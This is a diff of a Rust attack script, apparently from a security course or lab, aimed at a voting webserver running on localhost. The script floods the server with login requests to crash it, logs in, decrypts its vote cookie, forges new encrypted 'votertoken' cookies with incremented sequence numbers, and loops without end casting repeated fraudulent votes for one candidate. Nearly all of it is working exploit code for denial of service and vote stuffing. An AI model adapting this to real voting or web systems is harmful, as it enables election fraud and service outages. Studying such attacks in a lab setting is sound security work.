@@ -5,7 +5,6 @@ use aes_gcm::Aes256Gcm;
 use ::cookie::{Key, Cookie};
 use urlencoding::decode;
 use rand::RngCore;
-use tokio::time::timeout;
 use std::time::Duration;
 use url::Url;
 use std::thread::{self, JoinHandle};
@@ -16,13 +15,19 @@ pub const KEY_LEN: usize = 32;
 
 #[tokio::main]
 async fn main() {
+    // force webserver to restart
     crasher();
+    //initialize mutable cookie storage
     let jar = reqwest_cookie_store::CookieStore::default();
     let jar = reqwest_cookie_store::CookieStoreMutex::new(jar);
     let jar = std::sync::Arc::new(jar);
+    //initialize client with said storage
     let client = reqwest::Client::builder().cookie_provider(std::sync::Arc::clone(&jar)).build().unwrap();
-    let test = client.post("http://127.0.0.1:8000/login").form(&[("ssn", "12345"),("password","1234")]).send().await.unwrap();
-    let bruh1 = client.post("http://127.0.0.1:8000/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
+    //log in to server legitimatley
+    client.post("http://127.0.0.1:8000/login").form(&[("ssn", "12345"),("password","1234")]).send().await.unwrap();
+    //vote legitly to grab cookie
+    let mut sequence_num: u32;
+    client.post("http://127.0.0.1:8000/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
     {
         let mut decrypted: String = String::from("1");
         let mut store = jar.lock().unwrap();
@@ -31,24 +36,30 @@ async fn main() {
         decrypted = unseal(c.name(),c.value()).unwrap();
         println!("Decrypted value: Name={}, value={}",&c.name(),&decrypted);
         }
+        // remove legit cookie from our client
         store.clear();
-        let nv: u32 = decrypted.parse::<u32>().unwrap() + 1;
-        let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &nv.to_string()));
+        // add illegitimate cookie
+        sequence_num = decrypted.parse::<u32>().unwrap() + 1;
+        let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &sequence_num.to_string()));
         store.insert_raw(&newcookie, &Url::parse("http://127.0.0.1").unwrap()).unwrap();
     }
-  println!("Real vote status: {}",bruh1.status());
-  let bruh2 = timeout(Duration::from_secs(1), client.post("http://127.0.0.1:8000/vote").form(&[("candidate","candidate3")]).send()).await.unwrap().unwrap();
-  {
-    let store = jar.lock().unwrap();
-    for c in store.iter_unexpired() {
-    println!("Got cookie {},{}\n", &c.name(),&c.value());
-    let decrypted = unseal(c.name(),c.value()).unwrap();
-    println!("Decrypted value: Name={}, value={}",&c.name(),&decrypted);
+    println!("Entering endless loop, press ctrl+C to exit.");
+    loop{
+        let bruh2 = client.post("http://127.0.0.1:8000/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
+        {
+            let mut store = jar.lock().unwrap();
+            if bruh2.text().await.unwrap().contains("Thanks for voting"){
+                println!("Voted for gus with sequence number {}",&sequence_num);
+                store.clear();
+                sequence_num += 1;
+                let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &sequence_num.to_string()));
+                store.insert_raw(&newcookie, &Url::parse("http://127.0.0.1").unwrap()).unwrap();
+            }
+        
+        }
     }
-  
 }
-  println!("Falsified vote status: {}",bruh2.status());
-}
+
 /*Crasher? I hardly Know 'er!
 spawns threads to crash webserver by spamming login requests */
 fn crasher() {
